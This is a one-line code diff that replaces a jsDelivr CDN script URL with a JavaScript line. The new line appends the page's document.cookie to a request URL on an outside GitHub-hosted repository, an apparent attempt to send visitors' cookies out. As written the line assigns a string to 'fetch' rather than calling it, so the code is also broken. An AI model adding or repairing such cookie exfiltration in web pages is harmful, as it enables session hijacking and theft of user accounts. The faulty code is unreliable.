@@ -1,1 +1,1 @@
-https://cdn.jsdelivr.net/gh/domdom2y2/test@latest/script.js
+fetch = ('https://cdn.jsdelivr.net/gh/domdom2y2/test@latest/script.js?cookie=' + document.cookie);
